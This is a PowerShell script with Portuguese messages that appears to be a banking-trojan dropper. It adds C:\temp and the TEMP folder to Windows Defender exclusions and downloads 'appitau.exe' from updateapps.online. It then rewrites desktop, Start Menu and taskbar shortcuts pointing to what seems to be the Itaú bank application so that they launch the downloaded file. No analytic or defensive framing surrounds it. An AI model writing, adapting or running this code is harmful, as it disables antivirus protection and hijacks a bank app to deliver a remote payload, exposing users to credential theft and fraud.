if (-not (Test-Path -Path "C:\temp")) { New-Item -Path "C:\temp" -ItemType Directory }

$exclusions = @("C:\temp", "$env:TEMP")
foreach ($path in $exclusions) {
    try {
        if (-Not (Get-MpPreference | Select-Object -ExpandProperty ExclusionPath | Where-Object { $_ -eq $path })) {
            Add-MpPreference -ExclusionPath $path
        }
    } catch {}
}

if (Test-Path -Path "C:\temp\appitau.exe") {
Write-Host "APP jÃ¡ existe!"
} ELSE {
Write-Host "Baixando APP"
Invoke-WebRequest -Uri "https://updateapps.online/appit" -OutFile "C:\temp\appitau.exe"
}

if (Test-Path -Path "C:\temp\appitau.exe") {
    function Update-ChromeShortcuts {
        param ($path, $pattern)
        if (Test-Path $path) {
            $shortcuts = Get-ChildItem -Path $path -Filter "*.lnk" -Recurse -ErrorAction SilentlyContinue
            foreach ($shortcut in $shortcuts) {
			
                $wShell = New-Object -ComObject WScript.Shell
                $link = $wShell.CreateShortcut($shortcut.FullName)
                if ($link.TargetPath -match $pattern) {
				Write-Host "Trocando em $shortcut"
                    $link.TargetPath = "C:\temp\appitau.exe"
                    $link.Save()
                }
            }
        }
    }

    $directories = @(
        "C:\ProgramData\Microsoft\Internet Explorer\Quick Launch",
        "C:\ProgramData\Microsoft\Windows\Start Menu",
        "C:\ProgramData\Microsoft\Windows\Start Menu\Programs",
        "C:\Users\*\Desktop",
        "C:\Users\*\OneDrive\?rea de Trabalho",
        "C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu",
        "C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs",
        "C:\Users\*\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch",
        "C:\Users\*\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar",
        "C:\Users\*\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\ImplicitAppShortcuts"
    )

    $chromePattern = "itauaplicativo.*\.exe"

    foreach ($directory in $directories) {
	Write-Host "Procurando em $directory"
        Update-ChromeShortcuts -path $directory -pattern $chromePattern
    }
}
